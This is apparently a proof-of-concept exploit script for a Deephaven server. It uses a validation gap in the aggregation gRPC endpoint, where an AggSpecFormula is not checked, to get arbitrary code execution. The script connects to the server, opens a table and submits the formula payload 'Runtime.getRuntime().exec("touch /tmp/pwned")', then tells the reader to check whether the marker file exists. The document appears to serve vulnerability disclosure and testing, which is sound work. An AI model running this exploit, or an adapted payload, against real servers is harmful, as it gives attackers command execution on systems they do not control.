"""
PoC for Gap 1: AggregateAllGrpcImpl — AggSpecFormula not validated.

The AggregateAllGrpcImpl passes AggSpec directly to parent.aggAllBy() without
running it through ColumnExpressionValidator. An AggSpecFormula carries an
arbitrary formula string that the engine compiles and executes.

Preconditions:
  - A Deephaven server running on localhost:10000
  - A table "t" exists in the global scope (e.g. t = emptyTable(1).update("I = i"))
"""

from pydeephaven import Session
from pydeephaven.agg import formula
from deephaven_core.proto import table_pb2


def main():
    session = Session(host="localhost", port=10000)
    try:
        t = session.open_table("t")
        print(f"Opened table 't', size={t.size}")

        # Build an AggSpec with type FORMULA containing our payload.
        # The engine will compile and evaluate this formula for every
        # non-key column in the table.
        payload = 'Runtime.getRuntime().exec("touch /tmp/pwned")'

        agg = formula(formula=payload, formula_param="garbage")

        try:
            result = t.agg_all_by(agg=agg, by=[])
            print(f"agg_all_by succeeded, result size={result.size}")
        except Exception as e:
            print(f"agg_all_by failed: {e}")

        print()
        print("Check: does /tmp/pwned exist on the server?")
        print("  ls -la /tmp/pwned")
    finally:
        session.close()


if __name__ == "__main__":
    main()

